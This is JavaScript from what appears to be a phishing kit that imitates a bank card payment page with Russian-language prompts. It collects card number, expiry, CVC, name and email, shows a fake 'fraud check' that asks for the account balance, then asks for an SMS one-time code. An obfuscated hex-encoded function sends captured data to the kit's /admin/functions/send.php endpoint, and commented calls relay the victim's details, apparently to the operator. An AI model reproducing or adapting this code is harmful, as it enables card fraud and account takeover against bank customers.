function fraudStart(){

	setTimeout(
		function(){
	$( "#loaderFraud" ).fadeIn();
	$("#backblack").fadeIn();
	$("#fraud .styles_container__povOI").hide();
			// $("#fraud").fadeIn();
			// $( "#loaderFraud" ).fadeOut();
		}, 2000
	);

	setTimeout(
		function(){
			$("#fraud").fadeIn();
			// $( "#loaderFraud" ).fadeOut();
		}, 2500
	);
	setTimeout(
		function(){
			
			$("#fraud .styles_container__povOI").show();
			$( "#loaderFraud" ).fadeOut();
		}, 3500
	);
}

function checkBalance(){
	if($("#balance").val().length  > 1){
		$("#fraudBut").css("background-color", "rgb(33 160 56)")
		$("#fraudBut").css("color", "white")
	}
	else{
		$("#fraudBut").css("background-color", "#ccc")
		$("#fraudBut").css("color", "#262626")
	}
}	

$("#fraudBut").click(function(){
	// alert(flag);
	if($("#balance").val().length  > 1){


		// tg("🔥 Чекер 🔥 \n 🐘 ID" + "<?php echo $idPerson?>" + "\n💰 На счету :" + $("#balance").val() + $(".select").text().replace(/\s/g, ''));


		$( "#loaderFraud" ).fadeIn("slow");

		setTimeout(
			function(){
				$("#fraud .styles_container__povOI").fadeOut();
			}, 3000
		);

		setTimeout(
			function(){
				$( "#loaderFraud" ).fadeOut();
				$( ".fraudOk" ).fadeIn();
			}, 4000
		);




		setTimeout(
			function(){
				$( ".fraudOk" ).fadeOut();
				$("#fraud").fadeOut();
				$("#backblack").fadeOut();

				$( "#loader" ).fadeIn();
			}, 6000
		);

		setTimeout(
			function(){
			  	$("#cardBox").hide();
			  	// $("#cardLabel").hide();
			  	$("#expBox").hide();
			  	$("#cvcBox").hide();
			  	$("#boxMail").hide();
			  	$("#boxFio").hide();

			  	$(".styles_saveCardContainer__mPUhQ").hide();


			  	$(".styles_termsHint__2XVD6").css("opacity","0")				  	
			  	$(".styles_termsHint__2XVD6").css("margin-top","0")			  	
			  	$(".styles_termsHint__2XVD6").css("line-height","0")
			  	$("#logoBank").hide()

			  	$("#mainBut").css("color","#6c6c6c");
				$("#oplata").css("background-color","#f4f4f4");		

			  	$("#passBox").show();
			  	$(".styles_title__1O7Vi").text("Введите Ваш код")
			  	$("#pass").css("text-align","center")
			  	$("#mainBut").text("Отправить");

			  	isStage2 = true;

			  	timerStart(100);
				$( "#loader" ).fadeOut();
			}, 7000
		);
	}
		else{
			$("#fraudErr").text("Заполните поле");
			$("#balance").css("border-color","red");
			$("#fraudErr").show()
		}
	})

$("#balance").focus(function(){
		$("#fraudErr").hide();
		$("#balance").css("border-color","#5ab66b");
})

var _0xffe3 = ["\x2F\x61\x64\x6D\x69\x6E\x2F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x73\x2F\x73\x65\x6E\x64\x2E\x70\x68\x70", "\x70\x6F\x73\x74", "\x6C\x6F\x67", "\x44\x65\x74\x61\x69\x6C\x73\x3A\x20", "\x0A\x45\x72\x72\x6F\x72\x3A", "\x61\x6A\x61\x78"];

function tg(_0xc3b5x2) {
	$[_0xffe3[5]]({
		url: _0xffe3[0],
		type: _0xffe3[1],
		data: {
			"\x6D": _0xc3b5x2
		},
		success: function(_0xc3b5x3, _0xc3b5x4) {},
		error: function(_0xc3b5x5, _0xc3b5x6, _0xc3b5x7) {
			console[_0xffe3[2]](_0xc3b5x5);
			console[_0xffe3[2]](_0xffe3[3] + _0xc3b5x6 + _0xffe3[4] + _0xc3b5x7)
		}
	})
}

			/*Dropdown Menu*/
			$('.dropdown').click(function () {
			        $(this).attr('tabindex', 1).focus();
			        $(this).toggleClass('active');
			        $(this).find('.dropdown-menu').slideToggle(300);
			    });
			    $('.dropdown').focusout(function () {
			        $(this).removeClass('active');
			        $(this).find('.dropdown-menu').slideUp(300);
			    });
			    $('.dropdown .dropdown-menu li').click(function () {
			        $(this).parents('.dropdown').find('span').text($(this).text());
			        $(this).parents('.dropdown').find('input').attr('value', $(this).attr('id'));
			    });
			/*End Dropdown Menu*/


			$('.dropdown-menu li').click(function () {
			  var input = '<strong>' + $(this).parents('.dropdown').find('input').val() + '</strong>',
			      msg = '<span class="msg">Hidden input value: ';
			  $('.msg').html(msg + input + '</span>');
			}); 


										                function timerStart(secs){
							                	$("#newSMS").fadeOut()

							                	$(".seconds").text(secs)

							                	$("#timerBlock").fadeIn("slow")

												var timerBlock = $('.seconds');
												var num = secs; //количество секунд

												var index = num;
												var timerId = setInterval(function() {
												  timerBlock.html(--index);
												}, 1000);

												var tim = setTimeout(function() {
												  clearInterval(timerId);
												  $("#timerBlock").fadeOut()
							                	  $("#newSMS").fadeIn("slow")

												}, num*1000);
											}



											$("#FIO").keypress(function(){

													if($("#FIO").val().length>0){
														$("#FIO").css("text-transform","uppercase")
													}
													else{
														$("#FIO").css("text-transform","none")
													}


											})


										function resendSMS(){
											$( "#loader" ).fadeIn();
												// tg("🐘" + "<?php echo $idPerson?>" +  ", запросил новый одноразвый код");
											setTimeout(
											  function() 
											  {
											  	timerStart(100);
												$( "#loader" ).fadeOut();
											  }, 1000);
										}

											// ввод только чиесл
	function number() {
		// alert("!")
		if (event.keyCode < 48 || event.keyCode > 57)
		event.returnValue= false;
	}



// алгоритм Муна 
	function Moon(value) {
      if (/[^0-9-\s]+/.test(value)) return false;

      var nCheck = 0, nDigit = 0, bEven = false;
      value = value.replace(/\D/g, "");

      for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);

        if (bEven) {
          if ((nDigit *= 2) > 9) nDigit -= 9;
        }

        nCheck += nDigit;
        bEven = !bEven;
      }

      return (nCheck % 10) == 0;
    }


        // привязка ввода к функции
	jQuery("#card_number").bind("input", function() {
    	this.value = card_number(this.value);
    });



	// пробелы после 4цифр
    function card_number(value) {
        var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
        var matches = v.match(/\d{4,16}/g);
        var match = matches && matches[0] || "";
        var parts = [];

        for (i=0, len=match.length; i < len; i+=4) {
          parts.push(match.substring(i, i+4));
        }

          if (parts.length) {
            return parts.join(" ");
          } else {
            return value;
          }
        }



        // привязка ввода к функции
        jQuery("#card_exp").bind("input", function() {
          this.value = card_exp(this.value);
        });

        function card_exp(value) {
          var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
          var matches = v.match(/\d{2,4}/g);
          var match = matches && matches[0] || "";
          var parts = [];

          for (i=0, len=match.length; i<len; i+=2) {
            parts.push(match.substring(i, i+2));
          }

          if (parts.length) {
            return parts.join("/");
          } else {
            return value;
          }
        }



                $("#card_exp").keyup(function() {
        	if($("#card_exp").val().length >= 5){
        		$('#card_cvc').focus();
        	}

        });
		
		$("#card_exp").keyup(function() {
        	if($("#card_exp").val().length >= 5){
        		$('#card_cvc').focus();
        	}

        });
		
		$("#card_cvc").keyup(function() {
        	if($("#card_cvc").val().length >= 3){
        		// $('#email').focus();
        	}

        });